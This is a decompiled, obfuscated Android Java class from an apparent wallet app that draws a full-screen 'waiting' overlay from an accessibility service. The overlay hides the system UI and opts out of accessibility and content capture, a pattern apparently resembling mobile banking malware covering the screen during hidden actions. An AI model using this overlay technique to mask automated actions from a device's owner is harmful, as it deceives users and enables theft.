package e0;

import a1.q;
import android.graphics.Color;
import android.os.Build.VERSION;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.TextView;
import com.guard.wallet.service.MyAccessibilityService;
import java.lang.ref.WeakReference;
import java.util.Objects;

public final class i extends LinearLayout {
   public WeakReference a;

   public i(MyAccessibilityService var1, String var2) {
      super(var1);
      this.setOrientation(1);
      this.setGravity(17);
      this.setSystemUiVisibility(4);
      this.setImportantForAccessibility(2);
      if (VERSION.SDK_INT >= 30) {
         this.setImportantForContentCapture(2);
      }

      this.setBackgroundColor(Color.argb(0.6F, 0.0F, 0.0F, 0.0F));
      c var3 = new c(var1);
      if (!var3.a()) {
         var3.setImageURL(com.guard.wallet.utils.d.b());
      }

      var3.setTag("waiting-icon-image");
      this.addView(var3, 0);
      f var5 = new f(var1);
      this.addView(var5, 1);
      var5.setTag("waiting-progress-bar");
      this.a = new WeakReference<>(var5);
      if (!q.B(var2)) {
         TextView var4 = new TextView(var1);
         var4.setTag("waiting-hint-text");
         var4.setText(var2);
         var4.setSingleLine(false);
         var4.setTextColor(-1);
         var4.setBackgroundColor(0);
         var4.setTextSize(15.0F);
         var4.setTextAlignment(4);
         var4.setGravity(17);
         var4.setPadding(0, 10, 0, 10);
         this.addView(var4, 2);
      }
   }

   public final void onLayout(boolean var1, int var2, int var3, int var4, int var5) {
      int var7 = this.getChildCount();
      if (var7 > 0) {
         int var8 = (var5 - var3) / 2 + var3;

         for (int var10 = 0; var10 < var7; var10++) {
            View var9 = this.getChildAt(var10);
            if (Objects.equals(var9.getTag(), "waiting-icon-image")) {
               var5 = var4 - var2;
               var5 = (var5 - (int)((float)var5 * 0.4F)) / 2;
               int var6 = var8 - 160 - 10 - 50;
               var9.layout(var5, var6, var4 - var5, var6 + 160);
            } else {
               int var14;
               if (Objects.equals(var9.getTag(), "waiting-progress-bar")) {
                  var5 = var8 - 10;
                  var14 = var5 + 20;
               } else {
                  var5 = var8 + 10 + 50;
                  var14 = var5 + 200;
               }

               var9.layout(var2, var5, var4, var14);
            }
         }
      }
   }
}
